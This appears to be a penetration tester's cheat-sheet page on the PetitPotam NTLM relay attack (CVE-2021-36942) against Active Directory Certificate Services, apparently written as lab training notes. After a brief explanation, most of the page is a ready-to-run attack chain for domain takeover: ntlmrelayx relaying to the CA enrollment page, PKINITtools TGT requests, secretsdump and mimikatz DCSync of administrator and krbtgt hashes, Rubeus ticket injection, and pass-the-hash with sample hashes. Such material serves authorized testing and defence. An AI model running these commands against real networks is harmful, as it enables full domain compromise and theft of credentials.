# PetitPotam Exploit

OS: Active_Directory, Windows
Description: PetitPotam Exploit
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### PetitPotam

- PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

### Attack

- Download

```jsx
https://github.com/topotam/PetitPotam
```

- Start ntlmrelayx

```jsx
sudo ntlmrelayx.py -debug -smb2support --target http://TargetDomain.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

- Use the Base64 Certificate generated from the above command to request a TGT from the DC

```jsx
python3 /opt/PKINITtools/gettgtpkinit.py TargetDomain.LOCAL/Computer-DC01\$ -pfx-base64 <BASE64_CERT_FOUND_ABOVE>
```

- export the ccache

```jsx
 export KRB5CCNAME=dc01.ccache
```

- run secretsdump with this certificate

```jsx
secretsdump.py -just-dc-user TargetDomain/administrator -k -no-pass "Computer-DC01$"@TargetDomain.LOCAL
```

- PtH to verify Admin Access

```jsx
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

- Alternate Approach
    - The [gettgtpkiinit.py](http://gettgtpkiinit.py) command above will produce a ‘minikerberos’ encryption key

```jsx
python /opt/PKINITtools/getnthash.py -key minikerberos_key INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

- DCSync the rest

```jsx
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

### Another Route (On Windows)

- Using the base64 cert obtained from ntlmrelayx
- load kerberos ticket

```jsx
.\Rubeus.exe asktgt /user:Computer-DC01$ /certificate:BASE64_CERT /ptt
```

- klist will show the krbtgt ticket

```jsx
klist
```

- mimikatz

```jsx
lsadump::dcsync /user:inlanefreight\krbtgt
```